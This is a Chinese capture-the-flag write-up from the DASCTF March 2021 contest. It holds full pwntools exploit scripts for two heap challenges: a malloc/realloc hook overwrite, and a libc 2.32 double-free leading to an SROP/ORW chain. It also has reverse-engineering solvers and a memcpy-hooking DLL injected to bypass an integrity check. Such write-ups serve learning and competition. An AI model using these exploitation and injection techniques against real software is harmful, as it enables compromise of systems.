# MAR DASCTF明御攻防赛 PWN、RE Writeup

阅读量 **380479**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-31 17:00:53

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0147ec444cc31471b8.jpg)

比赛最后拿到了第二名（密码👴带我飞），作为队伍中的PWN & RE选手，赛后复现了一下全部RE题目和两题PWN。

![](https://p0.ssl.qhimg.com/t0141fc5f8fa6e0d837.png)

## PWN部分

###  fruitpie

![](https://p0.ssl.qhimg.com/t01132d07960a5b766b.png)

程序代码非常简单，申请一个任意size的堆块，然后告诉你堆块的地址，并且让你在堆块附近写入10字节的。

**解题思路**

**1.MMAP申请堆块**

我们知道当我们malloc一个大的堆块（0x200000）时就会使用mmap来分配堆块，此时堆地址紧挨libc，我们可以根据输出的堆块地址，来计算出libc的基址。

**2.Offset向前溢出**

程序没有对我们输入的offset做检测，所以我们可以利用这个offset对堆块附近的地址来写入内容。

**3.打__malloc_hook**

由于题目提供了libc文件，并且在程序结束位置调用了malloc函数，所以我们可以直接打malloc_hook，但实际上发现所有的one_gadget都无法成功打通。因此题目也给了10字节的权限，为的就是让你通过
**malloc_hook附近的** realloc_hook来调整栈帧。

**4.__realloc_hook调整栈帧**

我们知道在realloc函数的开头存在着非常多的push指令，我们可以借助这些指令来调整栈帧，并且这些指令都不会影响到之后调用__realloc_hook

![](https://p4.ssl.qhimg.com/t011b1aa0ea97a54ad1.png)

所以我们可以在 **realloc_hook的地址写入one_gadget的地址，在** malloc_hook的地址写入realloc +
x来调整栈帧，在这道题中x的取值可以有2, 4, 6, 8, 9。

PS：这道题直接用realloc符号找到的地址似乎不正确，要用__libc_realloc来定位地址。

**EXP**

    
    
    from pwn import *
    context.log_level = "debug"
    #r = process('./fruitpie')
    r = remote('54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com', 50102)
    def debug(addr = 0, PIE = True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(r.pid)).readlines()[1], 16)
            print ("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(r, 'b *{}'.format(hex(text_base + addr)))
        else:
            gdb.attach(r, "b *{}".format(hex(addr)))
    r.sendlineafter("Enter the size to malloc:", str(0x100000))
    r.recvuntil('0x')
    mmap_addr = int(r.recvuntil('\n', drop=True), 16)
    libc_base = mmap_addr - 0x515010
    one = [0x4f365, 0x4f3c2, 0x10a45c]
    log.success("libc_base: " + hex(libc_base))
    realloc_hook_addr = libc_base + 0x3ebc28
    realloc_addr = libc_base + 0x98ca0
    offset = realloc_hook_addr - mmap_addr
    r.sendlineafter("Offset:", hex(offset))
    # gdb.attach(r, "b __libc_realloc")
    r.sendafter("Data:", p64(libc_base + one[2]) + p64(realloc_addr + 2))
    r.interactive()
    

###  clown

libc2.32菜单堆题，拥有add，show，delete三种操作，在add中可以edit堆块内容。

开了沙箱，需要用orw

![](https://p0.ssl.qhimg.com/t011ea58041f0950d14.png)

###  程序分析

我们可以注意到在delete函数中存在，delete之后不清空的漏洞，我们可以利用这个来造成double free。

![](https://p5.ssl.qhimg.com/t01ff61760d723e2284.png)

在show函数中，使用puts输出堆块内容

![](https://p2.ssl.qhimg.com/t0123078d24c2f6e044.png)

在add函数中，要求堆块大小小于0x100，且堆块个数小于0xFF

![](https://p5.ssl.qhimg.com/t01f7bd36b3eafffac8.png)

**解题思路**

**1.利用unsorted bin泄露libc**

先释放7个chunk把tcache填满，然后再释放一个chunk进入到unsorted bin（注意要有个堆块与top chunk隔开），由于在libc
2.32下 main_arena + 88的地址末尾是\x00，所以我们需要覆盖最低字节才可以用puts输出。（虽然必须要覆盖一个字节）

**2.利用libc2.32新特性泄露heap base**

简单的来说就是在next位置会有一个key与next原来的内容进行异或并保存，这个key的地址就是next的位置右移12位（去掉末尾12位），当tcache链为空的时候，就是0与key进行异或，在next的位置内容就是key，我们可以泄露这个key来得到堆基址。

关于这个特性的详细介绍可以看我的博客：[http://blog.wjhwjhn.com/archives/186/](http://blog.wjhwjhn.com/archives/186/?fileGuid=K66x6YWJ8jWCqQyC)

**3.通过fastbin来构造double free再利用**

但是在libc 2.32中对于tcache double
free的检测有些严格，并且这道题只有在add的时候才能修改堆块，所以我们考虑用fastbin来构造出double
free（a->b->a），再fastbin reverse into
tcache这个机制让fastbin进入到tcache中，并且覆盖next内容到tcache
struct（与key异或后的结果），让单次任意读写漏洞变成多次任意读写漏洞。

**4.劫持tcache struct的内容到__free_hook**

由于之后SROP的payload过长，所以还要分成两段来写。同时需要注意把对应申请堆块size的counts变成1，否则无法申请出来。

**5.使用gadget来将rdi参数转移到rdx**

在 libc2.29 及以后的版本，setcontext + 61 中调用的参数变成了 rdx，而不是 rdi，这使得我们在利用__free_hook
传参的时候，无法直接传到 setcontext 中，这里我们就要考虑找一个 gadget 来传参使得 rdi 的参数转变到 rdx 上。

    
    
    mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    

可以使用这个gadget来转移参数，这个操作以及提及多次，这里不再复述，如果有疑问的可以看一下我之前发的文章。  
 **6.在free_hook旁边构造SROP**

这个纯属为了偷懒，让SROP和写__free_hook的操作放到一起去，这样就可以一次性搞定所有环节。不过最后因为size限制的问题还是分了两部来写。

注意：在libc2.32中新增了一个检测要求tcache申请的内容要与0x10对齐，否则会申请错误。

**EXP**

    
    
    from pwn import *
    context.log_level = "debug"
    r = process('./clown')
    #r = remote('pwn.machine.dasctf.com', 50501)
    libc = ELF('libc/libc.so.6')
    context.arch = "amd64"
    def choice(idx):
        r.sendafter(">> ", str(idx))
    
    def add(size, content = 'a'):
        choice(1)
        r.sendafter("Size: ", str(size))
        r.sendafter("Content: ", content)
    
    def delete(idx):
        choice(2)
        r.sendafter("Index: ", str(idx))
    
    def show(idx):
        choice(3)
        r.sendafter("Index: ", str(idx))
    
    #leak libc
    
    #fill tcache
    for i in range(7):
        add(0x100)
    add(0x100) #7
    add(0x100) #8
    for i in range(7):
        delete(i)
    
    delete(7) #into unsortedbin
    add(0x80) #9 partial overwrite
    show(7)
    libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1b7d61
    log.success("libc_base: " + hex(libc_base))
    libc.address = libc_base
    add(0x78) #10
    
    #leak heap_base
    add(0x68) #11
    delete(11)
    show(11)
    heap_base = u64(r.recvuntil('\nDone', drop=True)[-5:].ljust(8, '\x00')) << 12
    log.success("heap_base: " + hex(heap_base))
    
    #doube free & fastbin into tcache
    add(0x68, p64(0) * 2) #12
    add(0x68) #13
    #fill tcache
    for i in range(7):
        add(0x68) #14-20
    for i in range(7):
        delete(14 + i)
    
    #double free
    delete(11)
    delete(13)
    delete(11)
    #fastbin into tcache
    for i in range(7):
        add(0x68) #21-27
    
    #change next -> tcache struct
    add(0x68, p64((heap_base + 0xF0) ^ (heap_base >> 12))) #28
    add(0x68) #29
    add(0x68) #30
    
    #counts0 -> 1
    add(0xF8) #31
    delete(31)
    add(0xE8) #32
    delete(32)
    
    #hijack tcache struct 
    add(0x68, p64(0) + p64(libc.sym['__free_hook'] + 0xF0) + p64(libc.sym['__free_hook'])) #33
    
    #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    gadget = libc_base + 0x0000000000124990
    pop_rdi_addr = libc_base + 0x00000000000277d6
    pop_rsi_addr = libc_base + 0x0000000000032032
    pop_rdx_addr = libc.address + 0x00000000000c800d
    fake_frame_addr = libc.sym['__free_hook'] + 0x10
    frame = SigreturnFrame()
    
    frame.rax = 0
    frame.rdi = fake_frame_addr + 0xF8
    frame.rsp = fake_frame_addr + 0xF8 + 0x10
    frame.rip = pop_rdi_addr + 1  # : ret
    rop_data = [
        libc.sym['open'],
        pop_rdx_addr,
        0x100,
        pop_rdi_addr,
        3,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        libc.sym['read'],
        pop_rdi_addr,
        fake_frame_addr + 0x200,
        libc.sym['puts']
    ]
    
    payload = p64(gadget) + p64(fake_frame_addr) + '\x00' * 0x20 + p64(libc.sym['setcontext'] + 53) + str(frame)[0x28:] + "flag\x00\x00\x00\x00" + p64(0) + str(flat(rop_data))
    
    add(0xF8, payload[:0xF0]) #34 write to __free_hook part1
    add(0xE8, payload[0xF0:]) #35 write to __free_hook part2
    
    delete(34)
    r.interactive()
    

## RE部分

###  drinkSomeTea

不太容易发现的魔改Tea

**去除花指令**

观察主函数，发现有个调用的函数无法正常识别，无法查看伪代码。

观察汇编后发现存在花指令，于是我们考虑手动去除。

![](https://p4.ssl.qhimg.com/t013751132e979330d0.png)

可以看到我们代码中一定会跳转到地址是401117，但是IDA却被误导从401116开始汇编导致后续汇编出错。

我们可以在代码上按D键转换为数据。

![](https://p1.ssl.qhimg.com/t01de7c44c56714ff9c.png)

然后手动在401117位置按C键转化为代码。

![](https://p3.ssl.qhimg.com/t01540276f36d1b5250.png)

可以发现在401116位置多出了一个0xE8，我们可以用Patch工具修改为0x90（nop）指令

再到函数头部按P键识别为函数

![](https://p5.ssl.qhimg.com/t019e882a6f54aa08f1.png)

**TEA encode函数**

之后就可以F5查看伪代码了

![](https://p4.ssl.qhimg.com/t017f09163485bbb7f5.png)

稍微进行一下重命名就可以发现这是个很标准的tea加密函数，那么你就掉进这个坑里了，仔细观察变量类型都是int，但是在常规的tea加密函数中应该是用unsigned
int来对数据进行处理，所以导致一般网上的tea解密脚本无法使用，需要手动修改类型为int，两者在符号运算的过程中存在一定区别导致程序无法正确的计算。

**主函数逻辑**

![](https://p4.ssl.qhimg.com/t01bc8725cfa465f1af.png)

在main函数中的逻辑非常清晰，大概就是读入tea.png文件，然后每8字节进行一次加密，最后输出到tea.png.out文件中，对应的tea加密key就是那个fake
flag了，我们现在有了加密后的数据，只需要编写解密代码即可得到图片。

![](https://p0.ssl.qhimg.com/t01bd29313e7b395098.png)

**解题代码**

    
    
    #include <cstdio>
    #include <Windows.h>
    void encrypt(int* v, const unsigned int* k)
    {
        int v0 = v[0], v1 = v[1], sum = 0, i;
        int delta = 0x9E3779B9;
        int k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];
        for (i = 0; i < 32; i++)
        {
            sum += delta;
            v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
            v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
        }
        v[0] = v0;
        v[1] = v1;
    }
    void decrypt(int* v, unsigned int* k)
    {
        int v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i;
        int delta = 0x9e3779b9;
        int k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];
        for (i = 0; i < 32; i++)
        {
            v1 -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
            v0 -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
            sum -= delta;
        }
        v[0] = v0;
        v[1] = v1;
    }
    unsigned char file_data[0x10000];
    int main()
    {
        unsigned int k[4] = {
            0x67616C66, 0x6B61667B, 0x6C665F65, 0x7D216761
        };
        HANDLE h = CreateFileA("tea.png.out", 0xC0000000, 0, 0, 3u, 0x80u, 0);
        DWORD file_size = GetFileSize(h, 0);
        SetFilePointer(h, 0, 0, 0);
        DWORD  NumberOfBytesRead = 0;
        ReadFile(h, file_data, file_size, &NumberOfBytesRead, 0);
        CloseHandle(h);
        for (int i = 0; i < file_size >> 2; i += 2) decrypt(&((int*)file_data)[i], k);
        HANDLE v9 = CreateFileA("tea.png", 0xC0000000, 0, 0, 2u, 0x80u, 0);
        WriteFile(v9, &file_data, file_size, &NumberOfBytesRead, 0);
        CloseHandle(v9);
        return 0;
    }
    

###  Enjoyit-1

查壳发现是C#写的程序

![](https://p2.ssl.qhimg.com/t01731590d6bbadb435.png)

这时候就可以直接掏出C#反汇编神器 **dnSpy**

![](https://p4.ssl.qhimg.com/t014f4ca2fb1fab661d.png)

发现主要的程序逻辑如图，加密过程都在b.c函数中。

![](https://p1.ssl.qhimg.com/t0154dba34ea3614986.png)

观察b.c函数感觉是一个base64，再看一下base64表，发现是换表的base64。

![](https://p0.ssl.qhimg.com/t01e919426c934b2664.png)

编写python程序解密换表base64。

    
    
    import base64
    import string
    str1 = "yQXHyBvN3g/81gv51QXG1QTBxRr/yvXK1hC="
    string1 = "abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ="
    string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    print(base64.b64decode(str1.translate(str.maketrans(string1,string2))))
    

解密的内容输入后发现程序卡在了后续的循环上  
在旁边下断点并使用dnSpy调试程序（F5）

![](https://p2.ssl.qhimg.com/t012f69a2a45dead9ac.png)

在下方修改i的值为100000，即可绕过这个循环延迟

程序执行后输出flag：

![](https://p4.ssl.qhimg.com/t01ed95756cb9db9acc.png)

###  replace

**主函数逻辑**

![](https://p1.ssl.qhimg.com/t014a418be67707a3cc.png)

为了方便读者理解，我这里修改了函数名称。

实际上这道题和题目的意思一样，用假的加密函数来迷惑新手，实际上的加密过程中hook后的函数。而这个题目名称replace实际上就暗示了hook这个操作。

**fake_encode函数**

![](https://p1.ssl.qhimg.com/t01b4d729b14da3a507.png)

这部分内容实际上没有意义，因为真正的操作在这之后的replace函数中，而我也没有对这部分的内容进行计算，算出来的应该是个fake
flag吧，因为这道题的难度等级，意味着这道题肯定没有那么容易，所以我直接看向后面的代码。

**寻找true_encode函数**

我们这里使用IDA调试来快速的找到hook后的函数位置。

![](https://p3.ssl.qhimg.com/t011f8dc82d736e9622.png)

这里按F7步入到IsDebuggerPresent函数中

![](https://p3.ssl.qhimg.com/t01f9f2bb2bf3ac838f.png)

就这样简单的找到了真实的encode函数，这里又有一个花指令，我们只需要使用和上面一样的方法nop掉即可

![](https://p4.ssl.qhimg.com/t013e7015a3429d721c.png)

**真实加密函数**

接着使用F5查看程序的伪代码

![](https://p4.ssl.qhimg.com/t011026984f0c4056aa.png)

代码逻辑简单的来说就是用sbox对密码进行单表替换，并且之后进行类似栅栏密码的操作来加密，加密后的内容才是真正最后比对的内容。实际上这里使用了花指令导致这个函数无法被识别，这样让你用X查找引用也无法找到这个函数地址。

最后我们只需要把比对的内容复制出来，直接编写python脚本进行求解。

![](https://p4.ssl.qhimg.com/t016414657f4d0b128c.png)

在比赛过程中为了快速解题直接用z3来进行求解。

**解题代码**

这里有个细节就是要把求解的字节内容设置为32个位，这样在移位的时候才会使用32个位进行异或，否则是无法计算出正确的flag的。但是我们又要保证每个的内容只使用8个位，这时候就可以用
**x & 0xff == x**来限制范围。

    
    
    from z3 import *
    sbox = [0x00000080, 0x00000065, 0x0000002F, 0x00000034, 0x00000012, 0x00000037, 0x0000007D, 0x00000040, 0x00000026, 0x00000016, 0x0000004B, 0x0000004D, 0x00000055, 0x00000043, 0x0000005C, 0x00000017, 0x0000003F, 0x00000069, 0x00000079, 0x00000053, 0x00000018, 0x00000002, 0x00000006, 0x00000061, 0x00000027, 0x00000008, 0x00000049, 0x0000004A, 0x00000064, 0x00000023, 0x00000056, 0x0000005B, 0x0000006F, 0x00000011, 0x0000004F, 0x00000014, 0x00000004, 0x0000001E, 0x0000005E, 0x0000002D, 0x0000002A, 0x00000032, 0x0000002B, 0x0000006C, 0x00000074, 0x00000009, 0x0000006E, 0x00000042, 0x00000070, 0x0000005A, 0x00000071, 0x0000001C, 0x0000007B, 0x0000002C, 0x00000075, 0x00000054, 0x00000030, 0x0000007E, 0x0000005F, 0x0000000E, 0x00000001, 0x00000046, 0x0000001D, 0x00000020, 0x0000003C, 0x00000066, 0x0000006B, 0x00000076, 0x00000063, 0x00000047, 0x0000006A, 0x00000029, 0x00000025, 0x0000004E, 0x00000031, 0x00000013, 0x00000050, 0x00000051, 0x00000033, 0x00000059, 0x0000001A, 0x0000005D, 0x00000044, 0x0000003E, 0x00000028, 0x0000000F, 0x00000019, 0x0000002E, 0x00000005, 0x00000062, 0x0000004C, 0x0000003A, 0x00000021, 0x00000045, 0x0000001F, 0x00000038, 0x0000007F, 0x00000057, 0x0000003D, 0x0000001B, 0x0000003B, 0x00000024, 0x00000041, 0x00000077, 0x0000006D, 0x0000007A, 0x00000052, 0x00000073, 0x00000007, 0x00000010, 0x00000035, 0x0000000A, 0x0000000D, 0x00000003, 0x0000000B, 0x00000048, 0x00000067, 0x00000015, 0x00000078, 0x0000000C, 0x00000060, 0x00000039, 0x00000036, 0x00000022, 0x0000007C, 0x00000058, 0x00000072, 0x00000068]
    invSbox = {}
    for i in range(len(sbox)):
        invSbox[sbox[i]] = i
    s = "416f6b116549435c2c0f1143174339023d4d4c0f183e7828"
    num = []
    for i in range(6):
        num.append(int(s[i * 8: (i + 1) * 8], 16))
    solver = Solver()
    v3 = [BitVec(f'v{i}', 32) for i in range(24)]
    for i in range(24):
        solver.add(v3[i] & 0xFF == v3[i])
    for i in range(6):
        solver.add((v3[i + 12] << 8 | v3[i + 6] << 16 | v3[i] << 24 | v3[i + 18]) == num[i])
    solver.check()
    ans = solver.model()
    input_data = []
    for i in range(24):
        input_data.append(ans[v3[i]].as_long())
    for i in range(24):
        for j in range(5):
            input_data[i] = invSbox[input_data[i]]
    flag = ""
    for i in input_data:
        flag += chr(i)
    print(flag)

###  StrangeMine

这道题在比赛中没有做出来，本来以为是直接扫完就可以得到flag的，所以就拜托给队友来做了，结果发现没有这么简单，所以赛后复现一下

**寻找关键代码**

对于这种游戏的题目，使用CE来寻找关键的代码再合适不过了。

我们知道当我们完成游戏的时候会跳出flag，那么我们完成游戏之前的操作就是在雷上标旗帜。

所以我们可以搜索旗帜的数量作为关键点来入手。

![](https://p5.ssl.qhimg.com/t019033b479f94fe012.png)

搜索直到一个地址后

![](https://p1.ssl.qhimg.com/t0127dd9d81073d86fd.png)

在下方地址中按下F6

![](https://p0.ssl.qhimg.com/t01821c7839ab340214.png)

找出改写该地址的代码，然后再标一个旗帜来触发这个

![](https://p2.ssl.qhimg.com/t0167389059146a4ee9.png)

**分析代码逻辑**

在IDA中找到这个地址，并查看伪代码

![](https://p0.ssl.qhimg.com/t01b67643f09ddac568.png)

找到该函数的引用

![](https://p3.ssl.qhimg.com/t0154c6c5227f1974f4.png)

发现这个函数就是处理右键旗帜的主要逻辑函数，找到检测是否游戏结束的check函数。

![](https://p5.ssl.qhimg.com/t01a7a04f711b6b159a.png)

这里实际上检测所有炸弹是否被标记，如果有未标记的炸弹则返回0，否则会触发int3断点。

我们可以patch这个位置

![](https://p4.ssl.qhimg.com/t01241de4e236706577.png)

让他直接跳转到int3断点（这意味着游戏结束）

![](https://p3.ssl.qhimg.com/t01df9d186be37f3a07.png)

直接patch之后执行程序

![](https://p1.ssl.qhimg.com/t014047ee3067dfb2df.png)

但是提交flag发现是错误的，于是仔细的思考了这个题目。

**重新审视**

我们做到这里的一个疑问就是这个int3断点是干啥的，在哪里弹窗的flag？

猜测有其他地方存在异常处理函数并输出了flag信息。

仔细寻找后发现在这里

![](https://p2.ssl.qhimg.com/t019aec19cab0e6662a.png)

这个函数会处理异常信息，又是和之前类似的花指令，用类似的方式处理就可以查看伪代码了

![](https://p2.ssl.qhimg.com/t015c3ae6995a6d27dc.png)

这里会判定异常发生位置，并跳过一些无用的花指令异常，若在正确位置发生int3断点错误，就会使用程序的代码段内容计算md5内容并弹窗输出，而在我们patch之后，我们的程序代码段内容就发生了改变，这使得我们用patch的方式来修改程序的内容得出的md5信息错误，从而无法得到正常的flag信息。

所以这里我们考虑编写dll来hook这个程序的memcpy函数。

**Hook memcpy内容**

我在比赛的时候就卡在了这个部分，虽然能够想到用hook来解决这个问题，但是由于时间较短，并且没有现有的hook程序，就先去做PWN题了。

我们可以编写一个DLL来hook
memcpy函数，让他在复制这段内容的时候把patch的内容恢复到原样，这样的话就相当于绕过了这个md5检测，从而得到了正确的flag信息。Dll代码就不做解释了，有需要的可以直接抄走

    
    
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "pch.h"
    #pragma pack(push)
    #pragma pack(1)
    struct JmpCode
    {
        const BYTE jmp;
        DWORD address;
        JmpCode(DWORD srcAddr, DWORD dstAddr) : jmp(0xE9)
        {
            setAddress(srcAddr, dstAddr);
        }
        void setAddress(DWORD srcAddr, DWORD dstAddr)
        {
            address = dstAddr - srcAddr - sizeof(JmpCode);
        }
    };
    #pragma pack(pop)
    void Hook(void* originalFunction, void* hookFunction, BYTE* oldCode)
    {
        JmpCode code((uintptr_t)originalFunction, (uintptr_t)hookFunction);
        DWORD oldProtect, oldProtect2;
        if (!VirtualProtect(originalFunction, sizeof(code), PAGE_EXECUTE_READWRITE, &oldProtect))
        {
            printf("Hook Error\n");
            return;
        }
        memcpy(oldCode, originalFunction, sizeof(code));
        memcpy(originalFunction, &code, sizeof(code));
        if (!VirtualProtect(originalFunction, sizeof(code), oldProtect, &oldProtect2))
        {
            printf("Hook Error\n");
            return;
        }
    }
    void UnHook(void* originalFunction, BYTE* oldCode)
    {
        DWORD oldProtect, oldProtect2;
        VirtualProtect(originalFunction, sizeof(JmpCode), PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(originalFunction, oldCode, sizeof(JmpCode));
        VirtualProtect(originalFunction, sizeof(JmpCode), oldProtect, &oldProtect2);
    }
    BYTE OldCode[sizeof(JmpCode)];
    LPVOID memcpy_addr;
    void* __cdecl MyMemcpy(void* _Dst, void const* _Src, size_t _Size)
    {
        UnHook(memcpy_addr, OldCode);
        void* ret = memcpy(_Dst, _Src, _Size);
        Hook(memcpy_addr, MyMemcpy, OldCode);
        printf("_Dst = 0x%08x _Src = 0x%08x _Size = 0x%08x\n", (unsigned int)_Dst, (unsigned int)_Src, _Size);
        DWORD patchAddr = 0x403D64;
        if ((DWORD)_Src <= patchAddr && patchAddr <= (DWORD)_Src + _Size)
        {
            int offset = patchAddr - (DWORD)_Src;
            ((unsigned char *)_Dst)[offset] = 0x7D;
        }
        return ret;
    }
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
            freopen("C:\\log.txt", "w", stdout);
            HMODULE hModule = LoadLibraryA("VCRUNTIME140.dll");
            memcpy_addr = GetProcAddress(hModule, "memcpy");
            Hook(memcpy_addr, MyMemcpy, OldCode);
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            if (!memcpy_addr) UnHook(memcpy_addr, OldCode);
            break;
        }
        return TRUE;
    }
    

**运行程序并注入**

实际上在CE中就有一个注入攻击非常方便的可以使用

![](https://p2.ssl.qhimg.com/t015d2daeb8641b0155.png)

我们可以直接利用这个来选择我们编译好的DLL来注入，并且可以观察一下log文件。

![](https://p5.ssl.qhimg.com/t014190522acc78de21.png)

果然存在对我们patch部分的memcpy。

最终我们得到了正确的flag：

![](https://p4.ssl.qhimg.com/t0173adf63b3fbb1f6f.png)

## 总结

这次比赛的难度均匀，不同层次的选手做题都能有良好的体验。相对于一些大比赛来说，做题时间较短，更加考察的是选手的细心和做题速度。总的来说能收获不少，美中不足的是似乎没有官方wp给出，这让一些入门选手很难从题目中学到知识，希望这能够完善起来，最后祝DASCTF比赛越办越好！

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wjh** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/236178](/post/id/236178)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [RE](/tag/RE)

 **+1** __10赞

 __收藏

![](https://p4.ssl.qhimg.com/t0162586615c462960c.png) wjh

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

